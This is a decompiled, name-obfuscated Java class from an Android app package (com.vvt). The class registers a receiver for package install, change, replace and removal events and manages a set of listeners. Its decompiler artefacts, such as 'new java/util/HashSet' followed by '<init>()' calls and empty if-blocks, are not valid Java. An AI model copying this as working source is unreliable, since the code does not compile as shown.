package com.vvt.ab;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.IntentFilter;
import com.vvt.ak.a;
import java.util.HashSet;

public class b
{
  private static final boolean a = a.b;
  private BroadcastReceiver b;
  private HashSet c;
  private boolean d;
  
  public b()
  {
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.c = localHashSet;
  }
  
  public void a(Context paramContext)
  {
    boolean bool = this.d;
    if (!bool)
    {
      Object localObject = this.b;
      if (localObject == null)
      {
        localObject = new com/vvt/ab/c;
        ((c)localObject).<init>(this);
        this.b = ((BroadcastReceiver)localObject);
      }
      localObject = new android/content/IntentFilter;
      ((IntentFilter)localObject).<init>();
      ((IntentFilter)localObject).addAction("android.intent.action.PACKAGE_ADDED");
      ((IntentFilter)localObject).addAction("android.intent.action.PACKAGE_CHANGED");
      ((IntentFilter)localObject).addAction("android.intent.action.PACKAGE_REPLACED");
      ((IntentFilter)localObject).addAction("android.intent.action.PACKAGE_REMOVED");
      ((IntentFilter)localObject).addDataScheme("package");
      BroadcastReceiver localBroadcastReceiver = this.b;
      paramContext.registerReceiver(localBroadcastReceiver, (IntentFilter)localObject);
      bool = a;
      if (bool) {}
      bool = true;
      this.d = bool;
    }
  }
  
  public void a(d paramd)
  {
    this.c.add(paramd);
  }
  
  public void b(Context paramContext)
  {
    boolean bool = this.d;
    BroadcastReceiver localBroadcastReceiver;
    if (bool)
    {
      localBroadcastReceiver = this.b;
      if (localBroadcastReceiver == null) {}
    }
    try
    {
      localBroadcastReceiver = this.b;
      paramContext.unregisterReceiver(localBroadcastReceiver);
      bool = a;
      if (bool) {}
      bool = false;
      localBroadcastReceiver = null;
      this.d = false;
      return;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/ab/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */